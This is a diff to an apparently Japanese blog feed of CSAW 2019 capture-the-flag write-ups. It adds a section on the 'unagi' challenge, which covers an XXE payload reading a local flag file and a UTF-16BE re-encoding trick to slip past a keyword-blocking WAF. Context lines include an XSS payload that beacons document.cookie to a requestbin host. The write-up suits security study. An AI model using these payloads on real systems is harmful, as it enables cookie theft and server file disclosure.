@@ -285,6 +285,40 @@ idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#3
 &lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon(&#39;http://requestbin.net/r/ugix54ug&#39;, document.cookie)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;flag{csp_will_solve_EVERYTHING}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;h3 id=&#34;unagi&#34;&gt;unagi&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
+&lt;li&gt;XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない
+
+&lt;ul&gt;
+&lt;li&gt;PUBLIC は使えたりした&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった
+
+&lt;ul&gt;
+&lt;li&gt;試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x_utf-16.xml&lt;/code&gt; などで作成してアップロードする
+&lt;code&gt;xml
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root[
+&amp;lt;!ENTITY pass SYSTEM &amp;quot;file:///flag.txt&amp;quot;&amp;gt;
+]&amp;gt;
+&amp;lt;users&amp;gt;
+&amp;lt;user&amp;gt;
+&amp;lt;username&amp;gt;alice2&amp;lt;/username&amp;gt;
+&amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
+&amp;lt;name&amp;gt;Alice2&amp;lt;/name&amp;gt;
+&amp;lt;email&amp;gt;alice2@fakesite.com&amp;lt;/email&amp;gt;
+&amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
+&amp;lt;intro&amp;gt;&amp;amp;pass;&amp;lt;/intro&amp;gt;
+&amp;lt;/user&amp;gt;
+&amp;lt;/users&amp;gt;
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;flag{n0w_i&amp;rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 </description>
     </item>
     <item>
